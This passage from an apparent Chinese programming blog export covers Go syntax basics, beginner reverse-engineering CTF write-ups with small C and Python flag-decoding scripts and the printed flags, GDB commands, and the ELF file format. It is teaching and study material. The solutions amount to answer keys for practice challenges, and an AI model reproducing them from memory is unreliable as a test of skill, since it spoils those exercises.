空格声明变量必须使用空格隔开 var age int 在变量与运算之间也加入空格，使得程序看起来更加的美观 x = a + b 格式化字符串go字符串格式化符号 格式 描述 %v 按值的本来值输出 %+v 在%v的基础上，对结构体字段名和值进行展开 %#v 输出go语言语法格式的值 %T 输出go语言语法格式的类型和值 %% 输出%本体 %b 整型以二进制方式显示 %o 整型以八进制方式显示 %d 整型以十进制方式显示 %x 整型以十六进制方式显示 %X 整型以十六进制、字母大写方式显示 %U Unicode字符 %f 浮点数 %p 指针、十六进制方式显示 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package mainimport ( &quot;fmt&quot;)type point struct &#123; x, y int&#125;func main() &#123; p := point&#123;1, 2&#125; //输出结构体的对象值 fmt.Printf(&quot;%v\\n&quot;, p) fmt.Printf(&quot;%+v\\n&quot;, p) fmt.Printf(&quot;%#v\\n&quot;, p) //输出一个值得数据类型 fmt.Printf(&quot;%T\\n&quot;, p) //输出布尔类型 fmt.Printf(&quot;%t\\n&quot;, false) //格式化整型，十进制来输出，%ld,%Ld长整型数据；%hd输出短整型 fmt.Printf(&quot;%d\\n&quot;, 10) //二进制方式输出 fmt.Printf(&quot;%b\\n&quot;, 10) //输出数值所对应的ascii字符 fmt.Printf(&quot;%c\\n&quot;, 0x39) //十六进制方式输出 fmt.Printf(&quot;%x\\n&quot;, 10) //输出浮点型数值 fmt.Printf(&quot;%f\\n&quot;, 10.123) //科学计数法 fmt.Printf(&quot;%e\\n&quot;, 123400000.0) fmt.Printf(&quot;%E\\n&quot;, 123400000.0) //输出基本的字符串 fmt.Printf(&quot;%s\\n&quot;, &quot;\\&quot;string\\&quot;&quot;) //输出带双引号的字符串 fmt.Printf(&quot;%q\\n&quot;, &quot;\\&quot;string\\&quot;&quot;) fmt.Printf(&quot;%x\\n&quot;, &quot;b1ackie&quot;) //输出一个指针的值 fmt.Printf(&quot;%p\\n&quot;, &amp;p) //使用%后面的数字来控制输出的宽度，默认输出是右对齐，左边加上空格 fmt.Printf(&quot;|%6d|%6d|\\n&quot;, 123, 456789) //输出宽度，同时指定浮点数 fmt.Printf(&quot;|%5.2f|%5.2f|\\n&quot;, 1.2, 3.456) fmt.Printf(&quot;|%4s|%4s|\\n&quot;, &quot;go&quot;, &quot;good&quot;)&#125; 注意在go中不允许这样写 func main { } 只可以这样写 func main{ } Go数据类型Go语言按照类别有以下几种数据类型： 类型 描述 布尔型 布尔型的值只可以是常量true或者false。var b bool = true 数字类型 整型int和浮点型float32、float64，go支持整型和浮点型数字，并且支持复数，其中位的运算采用补码 字符串类型 字符串是一串固定长度的字符连接起来的字符序列。Go的字符串是由单个字节连接起来的。Go语言的字符串的字节使用UTF-8编码标识Unicode文本 派生类型 指针类型数组类型结构化类型Channel类型函数类型切片类型接口类型Map类型 数字类型 类型 描述 uint8 无符号8位整型（0到255） uint16 无符号16位整型（0到65535） uint32 无符号32位整型（0到4294967295） uint64 无符号 64 位整型 (0 到 18446744073709551615) int8 有符号 8 位整型 (-128 到 127) int16 有符号 16 位整型 (-32768 到 32767) int32 有符号 32 位整型 (-2147483648 到 2147483647) int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型 类型 描述 float32 IEEE-754 32位浮点型数 float64 IEEE-754 64位浮点型数 complex64 32 位实数和虚数 complex128 64 位实数和虚数 其他数字类型 类型 描述 byte 类似uint8 rune 类似int32 uint 32或64位 int 与int一样大小 uintptr 无符号整型，用于存放一个指针 Go语言变量Go变量名由字母、数字、下划线组成，其中首个字符不能是数字 声明变量是使用var关键字： var identifier type 可以一次性声明多个变量： var identifier1, identifier2 type 1234567891011package mainimport &quot;fmt&quot;func main() &#123; var a string = &quot;b1ackie&quot; fmt.Println(a) var b, c int = 1, 2 fmt.Println(b, c)&#125; 变量声明声明变量有几种方式 1第一种，指定变量类型，如果没有初始化，则变量默认为零值。 var v_name v_type v_name = value 零值就是变量没有做初始化时系统默认设置的值 1234567891011121314151617package mainimport &quot;fmt&quot;func main() &#123; //声明一个变量并初始化 var a string = &quot;b1ackie&quot; fmt.Println(a) //声明一个变量，没有初始化，为0值 var b int fmt.Println(b) //bool 的0值为false var c bool fmt.Println(c)&#125; 数值类型是0 布尔类型为false 字符串为空 2第二种，根据值自行判断变量类型 var v_name = value 123456789101112131415package mainimport &quot;fmt&quot;func main() &#123; var str = &quot;string&quot; fmt.Println(str) var num = 1 fmt.Println(num) var flag = true fmt.Println(flag)&#125; 3第三种，使用:=声明变量 v_name := value intValue := 1相当于 12var intValue intintValue = 1 var str string = &quot;b1ackie&quot;可以简写为str := &quot;b1ackie&quot; 123456789package mainimport &quot;fmt&quot;func main() &#123; str := &quot;b1ackie&quot; fmt.Println(str)&#125; 多变量声明123456789101112131415161718192021package mainimport &quot;fmt&quot;//这种方式写法一般用于声明全局变量var ( a float32 b bool)func main() &#123; //类型相同多个变量，非全局变量 var num1, num2, num3 int //自动判断变量类型 var int1, int2, int3 = 1, 2, 3 //这种不带声明格式的只能在函数中出现 c, d := 123, &quot;hello&quot; fmt.Println(a, b, c, d)&#125; Go语言常量常量是一个简单值的标识符，在程序运行时，不会被修改的量。 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。 常量的定义格式： const identifier [type] = value 也可以省略type，编译器可以根据变量的值来推断其类型 显示类型定义：const a string = “b1ackie” 隐式类型定义：const a = “b1ackie” 多个相同类型声明可以简写为： const num1, num2 = value1, value2 1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; const length int = 10 const width int = 20 var area int area = length * width fmt.Printf(&quot;the area is %d\\n&quot;, area) const a, b, c = 1, true, &quot;b1ackie&quot; fmt.Println(a, b, c)&#125; iotaiota，特殊常量，可以认为是一个可以被编译器修改的常量。 iota在const关键字出现时将被重置为0，const中每新增一行常量声明将使iota计数一次。 iota可以被用作枚举值： const( ​ a = iota ​ b = iota ​ c = iota ) 第一个iota等于0，每当iota在新的一行被使用时，它的值都会自动加1，所以a=0,b=1,c=2。 1234567891011121314151617package mainfunc main() &#123; const ( a = iota b c d = &quot;b1ackie&quot; e f = 10 g h = iota i ) println(a, b, c, d, e, f, g, h, i)&#125;","categories":[{"name":"Go语言学习","slug":"Go语言学习","permalink":"https://b1ackie.cn/categories/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Go语言","slug":"Go语言","permalink":"https://b1ackie.cn/tags/Go%E8%AF%AD%E8%A8%80/"}]},{"title":"攻防世界RE-新手练习区","slug":"攻防世界RE-新手练习区","date":"2021-11-03T10:30:12.000Z","updated":"2021-11-26T05:48:22.405Z","comments":true,"path":"2021/11/03/攻防世界RE-新手练习区/","link":"","permalink":"https://b1ackie.cn/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/","excerpt":"","text":"Hello CTF详细分析先查壳，看到无壳，可以直接打开。 使用IDA打开，可以看到我们输入的被转为十六进制最终存储在了v10之中，然后和v13比较，我们可以看到这部分的值是 437261636b4d654a757374466f7246756e 那么只需要将这部分十六进制值转为字符就行了，就是flag。 注册机1234int main() &#123; unsigned char flag[] =&quot;\\x43\\x72\\x61\\x63\\x6b\\x4d\\x65\\x4a\\x75\\x73\\x74\\x46\\x6f\\x72\\x46\\x75\\x6e&quot;; printf(&quot;%s&quot;, flag);&#125; 得到flag CrackMeJustForFun insanity查看文件可以知道是32位的elf文件 使用IDA打开，看到非常简短的main函数，前面会生成一个随机数，然后可以看到str是个数组，生产的随机数除以0xA的余数作为下标，来决定puts函数输出什么。 看一下str数组，可以看到flag就在其中，第一个就是flag，当然如果运气好，随机数正好是0xA的倍数也可以自己输出flag。 9447{This_is_a_flag} python-trade详细分析是一个pyc文件，在网上找一个反编译pyc的网站，查看反编译后的Python代码。 123456789101112131415161718192021#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport base64def encode(message): s = &#x27;&#x27; for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;flag = &#x27;&#x27;print &#x27;Input flag:&#x27;flag = raw_input()if encode(flag) == correct: print &#x27;correct&#x27;else: print &#x27;wrong&#x27; 根据python代码写出注册机，算出flag 注册机python123456789from base64 import *flag = &quot;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&quot;flag = b64decode(flag)s= &quot;&quot;for i in flag: i = (i - 16) ^ 32 s += chr(i)print(s) C12345678int main() &#123; unsigned char flag[] = &quot;^SdVkT#S ]`Y\\\\!^)\\x8f\\x80ism&quot;; for (int i = 0; i &lt; 21; i++) &#123; flag[i] = (flag[i] - 16) ^ 32; &#125; printf(&quot;%s&quot;, flag);&#125; nctf{d3c0mpil1n9_PyC} re1查壳，无壳，32位的程序 使用IDA打开分析，看到我们输入的值字符串会和v5.m128i_i8进行比较，查看其中的值 查看得到flag，注意这里是小端序 DUTCTF{We1c0met0DUTCTF} game详细分析查壳，无壳 这是一个游戏，需要把所有的灯都点亮，才可以输出flag。 使用OD调试，搜索字符串可以看到flag成功输出的这里，只要能够运行到这里就可以了。 可以直接在函数头部右键，选择此处为新的EIP，然后直接跑起来，flag就会自己出来。 也可以修改之前的跳转条件，让程序可以运行到输出flag的地方。 注册机使用IDA查看，可以看到如果满足所有的条件就会进入sub_457AB4 这是生成flag的地方，可以根据这里写出注册机。 12345678910111213141516int main() &#123; unsigned char v5[] = &quot;\\x12\\x40\\x62\\x05\\x02\\x04\\x06\\x03\\x06\\x30\\x31\\x41\\x20\\x0C\\x30\\x41&quot; &quot;\\x1F\\x4E\\x3E\\x20\\x31\\x20\\x01\\x39\\x60\\x03\\x15\\x09\\x04\\x3E\\x03\\x05&quot; &quot;\\x04\\x01\\x02\\x03\\x2C\\x41\\x4E\\x20\\x10\\x61\\x36\\x10\\x2C\\x34\\x20\\x40&quot; &quot;\\x59\\x2D\\x20\\x41\\x0F\\x22\\x12\\x10&quot;; unsigned char v2[] = &quot;\\x7B\\x20\\x12\\x62\\x77\\x6C\\x41\\x29\\x7C\\x50\\x7D\\x26\\x7C\\x6F\\x4A\\x31&quot; &quot;\\x53\\x6C\\x5E\\x6C\\x54\\x06\\x60\\x53\\x2C\\x79\\x68\\x6E\\x20\\x5F\\x75\\x65&quot; &quot;\\x63\\x7B\\x7F\\x77\\x60\\x30\\x6B\\x47\\x5C\\x1D\\x51\\x6B\\x5A\\x55\\x40\\x0C&quot; &quot;\\x2B\\x4C\\x56\\x0D\\x72\\x01\\x75\\x7E&quot;; for (int i = 0; i &lt; 56; i++) &#123; v2[i] = v2[i] ^ 0x13; v2[i] = v2[i] ^ v5[i]; &#125; printf(&quot;%s&quot;, v2);&#125; zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} open-source打开题目是一个C的源代码 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; if (argc != 4) &#123; //参数为4个 printf(&quot;what?\\n&quot;); exit(1); &#125; unsigned int first = atoi(argv[1]); if (first != 0xcafe) &#123; //第一个参数atoi后为0xcafe、51966 printf(&quot;you are wrong, sorry.\\n&quot;); exit(2); &#125; unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) &#123;//第二个参数 除以5 余数不能是3，除以17余数要等于8 printf(&quot;ha, you won&#x27;t get it!\\n&quot;); exit(3); &#125; if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123; printf(&quot;so close, dude!\\n&quot;); //第三个参数，等于h4cky0u exit(4); &#125; printf(&quot;Brr wrrr grr\\n&quot;); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(&quot;Get your key: &quot;); printf(&quot;%x\\n&quot;, hash); return 0;&#125; 根据源码分析可以知道需要输入三个参数，三个参数满足条件后就会输出flag。 第一个参数是51966 第二个参数除以5 余数不能是3，除以17余数要等于8 第三个参数，等于h4cky0u 根据条件求第二个参数，有很多，选择其中一个 python： 123for i in range(1,100): if(i % 5 != 3 and i % 17 == 8): print(i) 得到flag c0ffee simple-unpack查壳，可以看到是UPX的壳 直接使用upx-d脱壳 使用IDA打开，直接看到flag flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny} logmein详细分析64位elf文件，无壳 使用IDA打开。可以明显的看到具体的比较地方，和flag生成的方式。&amp;v7+i%v6，其中v6是7，也就是&amp;v7+i%7，将v7转换为字符，一共就是七个，而i取7的余数，这里就是在不断的获取v7的每一位来与v8进行异或。 注册机根据上面的分析写出注册机 12345678910int main() &#123; unsigned char a[] = &quot;\\x68\\x61\\x72\\x61\\x6D\\x62\\x65&quot;; char flag[] = &quot;:\\&quot;AL_RT^L*.?+6/46&quot;; for (int i = 0; i &lt; strlen(flag); i++) &#123; flag[i] = flag[i] ^ (a[i % 7]); &#125; printf(&quot;%s&quot;, flag); return 0;&#125; RC3-2016-XORISGUD no-strings-attached查壳，无壳，32位elf文件 使用IDA打开，分析发现关键函数是authenticate 看到输入被曝存在ws之中，然后wcscmp会比较s2和ws，s2是经过decrypt函数生成的。 查看具体的算法，看到是非常简单的减法。 数据为图中框起来的数据循环的减去1-5这几个数（因为都带着0x14，所以直接可以去掉0x14的） 注册机1234567891011int main() &#123; unsigned char s[] = &quot;\\x3A\\x36\\x37\\x3B\\x80\\x7A\\x71\\x78\\x63\\x66\\x73\\x67\\x62\\x65\\x73\\x60\\x6B\\x71\\x78&quot; &quot;\\x6A\\x73\\x70\\x64\\x78\\x6E\\x70\\x70\\x64\\x70\\x64\\x6E\\x7B\\x76\\x78\\x6A\\x73\\x7B\\x80&quot;; int a[] = &#123; 1,2,3,4,5 &#125;; for (int i = 0; i &lt; 38; i++) &#123; s[i] -= a[i % 5]; &#125; printf(&quot;%s&quot;, s); return 0;&#125; 9447{you_are_an_international_mystery} getit无壳，64位ELF文件 使用IDA打开，看到主要的流程是打开/tmp/flag.txt，然后向其中写入一些东西，但是最后又调用remove函数将其删除，所以是不可能查看flag.txt的，那么就看一下其写入的数据。看图中框选起来的部分可以看到，将s数组的每一位通过+1或者-1放在了t的十位以后的位置。 查看s与t 注册机123456789101112131415int main() &#123; char flag[] = &quot;c61b68366edeb7bdce3c6820314b7498&quot;; int tmp = 0; for (int i = 0; i &lt; 32; i++) &#123; if ((i &amp; 1) != 0) &#123; flag[i] += 1; &#125; else flag[i] -= 1; &#125; printf(&quot;SharifCTF&#123;%s&#125;&quot;, flag); return 0;&#125; SharifCTF{b70c59275fcfa8aebf2d5911223c6589} csaw2013reversing2详细分析查壳，无壳 直接运行程序，看到会弹出一个窗口，但是其中都是乱码根本不可读 使用IDA打开，看到lpMem就是那段乱码，正常流程都是弹窗显示这串字符，注意到sub_401000函数，其传入了参数lpMem 在其中对于lpMem进行了操作，可以看到主要是异或，并且四个字符作为一组来进行异或。 原始数据以及异或用的KEY 注册机1234567891011int main() &#123; unsigned char a[] = &quot;\\xBB\\xAA\\xCC\\xDD&quot;; unsigned char flag[] = &quot;\\xBB\\xCC\\xA0\\xBC\\xDC\\xD1\\xBE\\xB8\\xCD\\xCF\\xBE\\xAE\\xD2\\xC4\\xAB\\x82\\xD2\\xD9\\x93\\xB3\\xD4\\xDE\\x93\\xA9\\xD3\\xCB\\xB8\\x82\\xD3\\xCB\\xBE\\xB9&quot; &quot;\\x9A\\xD7\\xCC\\xDD&quot;; for (int i = 0; i &lt; 36; i++) &#123; flag[i] = flag[i] ^ a[i%4]; printf(&quot;%c&quot;, flag[i]); &#125; return 0;&#125; flag{reversing_is_not_that_hard!} maze无壳，64位的elf文件 限制是必须是输入24位，前五位是“nctf{”，最后一位是“}” 看到最终成功的条件是，一系列操作之后asc_601060[8 * v9 + v10[0]]中的值正好等于”#”， 查看前面的流程，看到对于上面这个数组的位移来说，输入O是-1，o是+1，.是-8，0是+8 此数组，也就是说是一个8*8的迷宫，需要走到”#”的位置。 如图中这样的迷宫，这样走可以走到“#”，然后带入前面的几个走的字符，得到flag nctf{o0oo00O000oooo..OO}","categories":[{"name":"攻防世界writeup","slug":"攻防世界writeup","permalink":"https://b1ackie.cn/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwriteup/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CTF","slug":"CTF","permalink":"https://b1ackie.cn/tags/CTF/"},{"name":"RE","slug":"RE","permalink":"https://b1ackie.cn/tags/RE/"}]},{"title":"GDB学习--基本操作","slug":"GDB操作","date":"2021-10-29T08:51:33.000Z","updated":"2021-11-03T06:38:09.851Z","comments":true,"path":"2021/10/29/GDB操作/","link":"","permalink":"https://b1ackie.cn/2021/10/29/GDB%E6%93%8D%E4%BD%9C/","excerpt":"","text":"前言记录一下学习GDB的一些东西，也不是所有的完全指令，主要还是一些日常用的。 在这里记录了一些比较全的命令，随时可以查看这里 https://github.com/evilpan/awesome-cheatsheets/blob/master/tools/gdb.txt GDB的一些命令先写一个小DEMO用来后面的GDB调试 123456789101112#include &lt;stdio.h&gt;int add(int x,int y)&#123; return x+y;&#125;int main()&#123; int x=10; int y=5; printf(&quot;sum is %d\\n&quot;,add(x,y)); return 0;&#125; 输入命令gdb，就可以打开gdb了，如图是gdb的界面。 先列出一些gdb的常用指令。 命令 功能 run-r 运行程序，如果碰到断点的话就会停下来 break-b 设置断点 help-h 帮助菜单 step-s 单步步进，就是OD里的F7 next-n 单步步过，也就是OD里的F8 finish-fin 执行程序直到指定的栈帧返回，也就是调用了一个函数，执行到retn再执行retn print-p 打印一些信息 quit-q 退出 GDB操作打开gdb之后，输入file + 文件名 即可将文件附加进去。 输入start命令可以停在main函数处，与run命令的区别是，后者是运行碰到断点停下，前者是停在main函数处。 断点类break指令可以下断点，快捷是b，不带任何参数时，是在所选栈帧中执行的下一条指令处下断。 b func：对函数下断，如图对main和add函数下断。 b line：在当前源代码的指定行下断。 b file:line：在源码文件的line行处下断。 b file:function：在源码文件的function处下断。 b *addr：在程序指定地址处下断。 info breakpoints：可以列出当前所有的断点信息，快捷i b delete num：删除指定编号的断点。 clear function：删除指定函数的断点 delete：删除所有断点 运行类run：运行程序 run args：以某参数运行程序 set args (args)：设置参数 show args：查看当前的运行参数 step：单步步入，碰到函数会进入，就是OD中的F7。 step count：单步conut次 next：单步步过，OD中的F8 next count：单步count次 finish：结束当前函数的运行 kill：杀死当前运行的函数 栈帧bt：打印当前backtrace frame：显示当前运行的栈帧 浏览数据print expression ：打印表达式，可以简写为p p /x expression：十六进制输出 p /x $寄存器：十六进制打印寄存器的值 x/&lt;n/f/u&gt; &lt;addr&gt;：打印指定地址的内存数据，其中n是一个正整数，表示显示内存的长度；f是显示的格式，字符串可以是s，指令地址可以用i；u表示从当前地址往后请求的字节数，不指定的话默认是4字节，b代表单字节，w表示4字节，g表示8字节。 输出格式： x 按十六进制格式显示变量； d 按十进制格式显示变量； u 按十六进制格式显示无符号整型； o 按八进制格式显示变量； t 按二进制格式显示变量； a 按十六进制格式显示变量； c 按字符格式显示变量； f 按浮点数格式显示变量。","categories":[{"name":"学习记录","slug":"学习记录","permalink":"https://b1ackie.cn/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"GDB","slug":"GDB","permalink":"https://b1ackie.cn/tags/GDB/"}]},{"title":"elf文件格式","slug":"elf文件格式","date":"2021-10-26T09:49:49.000Z","updated":"2021-12-06T05:37:57.925Z","comments":true,"path":"2021/10/26/elf文件格式/","link":"","permalink":"https://b1ackie.cn/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/","excerpt":"","text":"ELF文件格式elf文件，Executable and Linking Format，“可执行可连接格式”，具有这种格式的文件称为elf文件。 在elf规范中，把elf文件宽泛的称为“目标文件（Object File）”，这与我们通常理解的“.o”文件不同，elf文件仅指连接好的可执行文件。对于“.o”文件，可以直接称为可重定位文件。 elf文件主要分为三种类型： 可重定位文件（relocatable file）：由源文件编译而成且尚未链接的目标文件，通常以“.o”作为扩展名，用于与其他目标文件进行连接以构建可执行文件或动态链接库，通常是一段位置独立的代码。 共享目标文件（shared object file）：动态链接库文件。用于在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或者在可执行文件加载时，链接到进程中作为运行代码的一部分。 可执行文件（executable file）：经过链接的、可执行的目标文件，通常也被称为程序。 目标文件的作用有两个，一是用于构建程序，构建动态链接库或可执行程序；二是用于运行程序。所以有两种视角来看待一个程序，链接视角，通过节来进行划分，另一种是运行视角，通过段来进行划分。 链接视角 运行视角 ELF文件头 ELF文件头 程序头表（可选） 程序头表 第一节 第二节 第一段 … … 第N节 第N段 节头表 段头表（可选） 这里使用的示例程序 1234567891011121314151617#include &lt;stdio.h&gt;int global_init_var = 10;int global_uninit_var;void func(int sum)&#123; printf(&quot;%d\\n&quot;,sum);&#125;void main(void)&#123; static int local_static_init_var = 20; static int local_static_uninit_var; int local_init_var = 30; int local_uninit_var ; func(global_init_var + local_init_var + local_static_init_var);&#125; 执行下面四个命令，可以分别生成前面说过的几种文件 gcc elfDemo.c -o elfDemo.execgcc -static elfDemo.c -o elfDemo_static.execgcc -c elfDemo.c -o elfDemo.relgcc -c -fPIC elfDemo.c -o elfDemo_pic.rel &amp;&amp; gcc -shared elfDemo_pic.rel -o elfDemo.dyn 使用file命令查看，可以看到它们的类型 elf文件头elf文件头位于目标文件最开始的位置，包含描述整个文件的一些基本信息，比如elf文件类型、版本、目标机器、程序入口等。 如图可以看到elfDemo.rel文件头的一些信息。 Elf64_Ehdr结构体如下所示： 1234567891011121314151617typedef struct &#123; unsigned char e_ident[EI_NIDENT]; //elf标志 Elf64_Half e_type; //文件类型 Elf64_Half e_machine; //该文件适用的处理器体系结构 Elf64_Word e_version; //目标文件版本 Elf64_Addr e_entry; //程序入口的虚拟地址 Elf64_Off e_phoff; //程序头表开始处在文件中的偏移 Elf64_Off e_shoff; //节头表开始处在文件中的偏移 Elf64_Word e_flags; //处理器特定的标志位 Elf64_Half e_ehsize; //elf文件头的大小 Elf64_Half e_phentsize; //程序头表中表项大小 Elf64_Half e_phnum; //程序头表中表项数 Elf64_Half e_shentsize; //节头表中表项大小 Elf64_Half e_shnum; //节头表表项数 Elf64_Half e_shstrndx //节头表与节名字表对应的表项索引&#125;Elf64_Ehdr; 节一个目标文件包含许多节，这些节的信息保存在节头表中，表的每一项都是Elf64_Shdr结构体，记录了节的名字、长度、偏移等信息。节头表的位置记录在文件头的e_shoff域中。节头表对于程序运行不是必须的， elfDemo.rel的节头表如下所示： Elf64_Shdr结构体如下： 12345678910111213typedef struct&#123; Elf64_Word sh_name; //节的名字，只是一个索引号 Elf64_Word sh_type; //节类型 Elf64_Xword sh_flags; //节属性 Elf64_Addr sh_addr; //映射的起始地址 Elf64_Off sh_offset; //相对于文件开头的偏移量 Elf64_Xword sh_size; //节的大小，单位是字节 Elf64_Word sh_link; //索引值，指向节头表中本节所对应的位置 Elf64_Word sh_info; //节的附加信息 Elf64_Xword sh_addralign; //节的对齐信息 Elf64_Xword sh_entsize; //指定每一个表项的大小&#125;Elf64_Shdr; 下面来分别看看示例程序elfDemo.rel的.text节.data节和.bss节。 首先是.text节，Contents of section中从左到右依次是偏移，数据，以及十六进制形式。 Disassembly of section则是反汇编的结果 接下来看数据节和只读数据节。可以看到在.data中保存着0a000000和14000000而它们分别是int global_init_var和static int local_static_init_var（0xa=10，0x14=20）。 .rodata保存只读数据，包括只读变量和字符串常量。源码中调用printf用了“%d\\n”，这是一种只读数据，保存在.rodata中。 BSS节用于保存未初始化的全局变量和局部静态变量。可以看到它并没有CONTENTS属性，表示该节在文件中实际上不存在，只是为了变量预留位置。 其他一些常见的节 节名 说明 .comment 版本控制信息，如编译器版本 .debug_XXX DWARF格式的调试信息 .strtab 字符串表 .shstrtab 节名的字符串表 .symtab 符号表 .dynamic ld.so使用的动态链接信息 .dynstr 动态链接的字符串表 .dynsym 动态链接的符号表 .got 全局偏移量表，用于保存全局变量引用的地址 .got.plt 全局偏移量表，用于保存函数引用的地址 .plt 过程链接表，用于延迟绑定 .hash 符号哈希表 .rela.dyn 变量的动态重定位表 .rela.plt 函数的动态重定位表 .rel.text/rela.text 静态重定位表 .rel.XXX/rela.XXX 其他节的静态重定位表 .note.XXX 额外的编译信息 .eh_frame 用于操作异常的frame unwind信息 .init/.fini 程序初始化和终止的代码 字符串表字符串表包含了以NULL结尾的字符序列，用来表示符号名和节名，引用字符串时只需要给出字符序列在表中的偏移即可。字符串表的第一个字符和最后一个字符都是NULL字符，确保所有字符串的开始和终止。 符号表符号表记录了目标文件中所用到的所有符号信息，通常分为.dynsym和.symtab。.dynsym保存了引用自外部文件的符号，只能在运行时被解析，而.symtab还保存了本地符号，用于调试和链接。目标文件通过一个符号在表中的索引值来使用该符号。索引值从0开始计数，但值为0的表项不具有实际的意义，它表示未定义的符号。每个符号都有一个符号值，对于变量和函数，该值就是符号的地址。 123456789typedef struct&#123; Elf64_Word st_name; //符号名字 unsigned char st_info; //符号类型和属性 unsigned char st_other; //暂未使用 Elf64_Section st_shndx; //节索引 Elf64_Addr st_value; //符号值 Elf64_Xword st_size; //符号大小&#125;Elf64_Sym; 重定位表重定位是把符号引用与符号定义连接在一起的过程。我们在编写程序的过程中，我们只需要写入要调用的函数名（即符号引用），在重定位的过程中，函数名会与实际的函数所在地址联系起来，让程序知道应该跳转到哪里去。 Elf64_Rel和Elf64_Rela的结构体如下所示。 12345typedef struct&#123; Elf64_Addr r_offset; //重定位时需要被修改的符号的偏移 Elf64_Xword r_info; //重定位类型和符号索引&#125;Elf64_Rel; 123456typedef struct&#123; Elf64_Addr r_offset; //重定位时需要被修改的符号的偏移 Elf64_Xword r_info; //重定位类型和符号索引 Elf64_Sword r_addend; //做偏移调整&#125;Elf64_Rela; 可执行文件的装载刚才了解了目标文件的链接视角，下面将从运行视角来看一下。当运行一个程序的时候，首先要将该文件和动态链接库装载到进程空间中，形成一个进程镜像。每一个进程都拥有独立的虚拟地址空间，这个空间的布局是由记录在段头表中的程序头决定的。 可以看到每个段都包含了一个或者多个节，相当于是对这些节进行了分组，段的出现也正是出于此目的。随着节的数量增多，在进行内存映射的时候就产生了空间和资源浪费的问题。实际上，系统并不关心每个节的实际内容，而是关心这些节的权限，通过将不同权限的节分组，即可同时装载多个节，从而节省资源。 下面简要的讲解几个段。 通常一个可执行文件至少要有一个PT_LOAD类型的段，用于描述可装载的节，而动态链接的可执行文件则包含两个，将.data和.text分开存放。动态段PT_DYNAMIC包含了一些动态链接所必须的信息，如共享库列表、GOT表等。PT_NOTE类型的段保存了系统相关的附加信息。PT_INTERP段将位置和大小信息存放在一个字符串中，是对程序解释器位置的描述。PT_PHDR段保存了程序头表本身的位置和大小。 Elf64_Phdr结构如下 1234567891011typedef struct&#123; Elf64_Word p_type; //段类型 Elf64_Word p_flags; //段属性 Elf64_Off p_offset; //段开头偏移量 Elf64_Addr p_vaddr; //段开始位置的虚拟地址 Elf64_Addr p_paddr; //段开始的物理空间 Elf64_Xword p_filesz; //段在文件中的大小 Elf64_Xword p_memsz; //段在内容镜像中的大小 Elf64_Xword p_align; //段对齐&#125;Elf64_Phdr; 静态链接地址空间的分配链接由链接器完成，根据发生的时间不同，可以分为编译时链接、加载时链接和运行时链接。 重新写两个示例文件,main.c和func.c. main.c 123456789extern int shared;extern void func(int *a,int *b);int main()&#123; int a = 100; func(&amp;a,&amp;shared); return 0;&#125; func.c 12345678int shared = 1;int tmp=0;void func(int *a,int *b)&#123; tmp = *a; *a = *b; *b = tmp;&#125; 使用如下命令进行编译 1gcc -static -fno-stack-protector main.c func.c -save-temps --verbose -o func.ELF 在将main.o和func.o两个目标文件链接成一个可执行文件时，最简单的方法是按照顺序叠加。 这里就直接用了书上的图 这种方法的弊端就是，如果参与链接文件很多的话，那么输出的可执行文件就会非常的零散。从对齐的角度来讲，越多的代码节和数据节也会造成内存空间的浪费。 另一种方案就是将相似的节进行合并，将不同目标文件相同属性的节合并为一个节，比如将两个文件中的.text节合并为新的.text节。这种方案被当前的链接器所采用，首先对各个节的长度、属性和偏移进行分析，然后将输入目标文件中符号表的符号定义与符号引用统一生成全局符号表，最后读取输入文件的各类信息对符号进行解析、重定位等操作。相似节的合并就发生在重定位时。完成之后，程序中的每个指令和全局变量就有唯一的运行时内存地址了。 此图也直接用了书上的图。 静态链接的详细过程为了构造可执行文件，链接器必须完成两个重要的工作：符号解析和重定位。符号解析是将每个符号（函数、全局变量、静态变量）的引用与其定义进行关联。重定位则是将每个符号的定义与一个内存地址进行关联，然后修改这些符号的引用，使其指向这个内存地址。 可以比较一下静态链接可执行文件func.ELF和中间产物main.o的区别。重点关注下.text、.data和.bss节。 VMA是虚拟地址，LMA是加载地址，一般情况下，两者是相同的。可以看到main.o的VMA和LMA都是0而链接完成后的func.ELF中，相似节被合并，完成了虚拟地址的分配。 查看main.o的反汇编代码，看到在1D处，进行了call指令，这就是对于func的调用，此时符号还没有重定位，看到相对的偏移是0。 再看链接完成后的func.ELF，可以看到400b8a处的call func，其中机器码是e8 07，而下一条指令偏移7处就是400b96，func的地址。 可重定位文件中最重要的就是要包含重定位表，用于告诉链接器如何修改节的内容。每个重定位表对应一个需要被重定位的节，例如名为.rel.text的节用于保存.text的重定位表。 